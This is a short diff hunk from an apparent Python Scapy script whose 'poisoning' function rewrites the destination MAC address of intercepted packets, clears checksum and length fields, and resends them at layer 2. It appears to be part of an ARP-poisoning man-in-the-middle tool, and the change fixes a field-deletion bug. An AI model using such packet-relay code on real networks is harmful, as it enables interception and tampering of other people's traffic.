@@ -59,7 +59,7 @@ def poisoning(packet):
 			packet[Ether].dst = rmac
 			if packet.hasclearlayer(UDP) == 1:
 				del packet[UDP].chksum,packet[UDP].len		
-			del packet.chksum,packet.chksum
+			del packet.chksum,packet.len
 			# Send in Layer 2
 			sendp(packet)
 		if packet[IP].dst==dip:
